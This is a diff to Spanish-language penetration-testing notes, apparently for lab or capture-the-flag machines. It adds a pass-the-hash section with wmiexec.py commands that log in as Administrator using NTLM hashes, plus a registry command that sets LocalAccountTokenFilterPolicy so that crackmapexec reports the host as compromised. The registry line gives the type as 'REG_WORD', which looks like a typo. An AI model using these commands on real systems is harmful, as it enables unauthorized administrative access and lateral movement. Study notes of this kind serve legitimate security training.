@@ -1372,6 +1372,23 @@ Para enumerar los shares
 crackmapexec smb 127.0.0.1 -u 's4vitar' -p 'password123.' --shares
 ```
 
+## Pass the hash
+
+Si conseguimos el hash del administrador y el puerto 445 (al parecer esta abierto se puede hacer esto..
+
+```
+wmiexec.py -hashes :601c36b2ecfa2407ceab19fe6b366c7f Administrator@10.10.10.11
+#Cuandono estas en nungun dominio
+wmiexec.py WORKGROUP/Administrator@10.10.14.19 -hashes :d3c87620c26302e9f04a756e3301e63a
+```
+
+## Ruta para permitir la administracion remota
+
+En términos prácticos, este comando está modificando el Registro de Windows para ajustar la configuración LocalAccountTokenFilterPolicy en la clave System. El valor 1 generalmente se utiliza para permitir la administración remota del sistema. Sin embargo, ten en cuenta que realizar cambios en el Registro puede afectar el funcionamiento del sistema, y siempre se debe tener precaución al modificar configuraciones del Registro. YA CON ESTO el crackmapexec poner el POWNED.
+
+```
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_WORD /d 1 /f
+```
 
 
 
